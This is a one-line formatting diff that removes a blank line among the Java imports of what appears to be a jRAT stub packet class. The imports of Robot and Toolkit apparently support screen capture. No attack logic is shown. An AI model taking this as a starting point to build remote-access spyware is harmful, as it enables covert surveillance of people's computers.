@@ -3,7 +3,6 @@ package io.jrat.stub.packets.outgoing;
 import io.jrat.common.io.StringWriter;
 import io.jrat.common.utils.ImageUtils;
 import io.jrat.common.utils.Utils;
-
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
